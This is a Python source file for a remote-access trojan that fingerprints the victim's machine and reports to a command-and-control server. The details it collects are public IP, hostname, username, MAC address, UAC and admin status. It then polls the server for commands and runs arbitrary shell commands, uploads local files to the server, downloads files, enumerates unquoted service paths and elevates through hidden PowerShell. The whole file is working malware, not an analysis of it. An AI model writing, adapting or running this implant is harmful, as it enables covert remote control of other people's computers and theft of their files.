from time import sleep
from subprocess import Popen, PIPE
from platform import platform, uname

a = 'ipconfig | find "Default Gateway"' if platform().startswith("Win") else "ip route show | grep default"
output = Popen(a, shell=True, stdout=PIPE).communicate()
while not any(char.isdigit() for char in output[0].decode(encoding = 'unicode_escape')):
    output = Popen(a, shell=True, stdout=PIPE).communicate()
    sleep(10)

from requests import post,get
from uuid import getnode as get_mac
from getpass import getuser
from os import chdir, getcwd,system,name
from os.path import isdir, isfile,dirname, realpath

user_identifier =get_mac()

detail = get('http://ipinfo.io/json').json()
detail['os'] = platform()
detail['hostname'] = uname()[1]
detail['username'] = getuser()
detail['user_identifier'] = user_identifier
uac = Popen('REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin', shell=True, stdout=PIPE, stderr=PIPE).communicate()
detail['uac'] = "Is Disabled!" if "0x0" in uac else "Is Enabled!"
a = 'net user %username% | find "Admini"' if platform().startswith("Win") else 'sudo -v'
detail['isadmin'] = "False" if not "Sorry" or "*Administrators" not in str(Popen(a, shell=True, stdout=PIPE, stderr=PIPE).communicate()) else "True"
detail['admin'] = "Is active!" if "Yes" in str(Popen('net user Administrator | find "act"', shell=True, stdout=PIPE, stderr=PIPE).communicate())else "Is not active!"
detail['pwd'] = dirname(realpath(__file__))

a = post("http://127.0.0.1/c2/victim_controller", data=detail)

while True:
    b = get('http://127.0.0.1/c2/victim_controller?user_identifier=' + str(user_identifier))
    b, response = b.text.split(";")
    files = None
    if not b.startswith("sleep"):
        if b == "priv-unquoted" and platform().startswith("Win"):
            b = "wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\" "
        # change dir if exist.
        if "upload" in b.lower():
            upload, *pathos = b.split()
            if isfile(" ".join(pathos)):
                files = {'upload_file': open(" ".join(pathos), 'rb')}
                output = " ".join(pathos)+ " upload seccesfuly to the server! "
                b = "blabla"
            else:
                output = ("this is not a file! : "+ " ".join(pathos))
        elif "download" in b.lower():
            download, file = b.split("^")
            data = post("http://127.0.0.1/c2/download/"+file)
            if data.status_code == 404:
                output = "The file name is incorrect or there is no such file"
            else:
                with open(dirname(realpath(__file__))+"\\"+file,"wb") as s: s.write(data.content)
                output = "The file transfer succesfully!"
        elif b[:3] == "cd " or b[:3] == "cd.":
            if not isdir(b[3::]):
                output = "This folder does not exist!"
            else:
                chdir(b[3::])
                output = getcwd()
        elif b[:3] == "adm" and platform().startswith("Win") :
            Popen(["powershell", "start-process", "powershell", "-verb", "runAs", "-windowstyle hidden",
                   "-ArgumentList '{}'".format(b[3:])])
            output = "The command run succsesfully "
        else:
            output, errors = Popen(b, shell=True, stdout=PIPE, stderr=PIPE).communicate()
            if errors.decode() != "":
                output = errors.decode()
        ans = {"answer":output,"user_identifier":user_identifier,"res":response}
        send_data = post('http://127.0.0.1/c2/victim_controller', data=ans,files=files)
    else:
        if b == "sleep":
            x = 20
        else:
            b,x = b.split(" ")
        sleep(int(x))



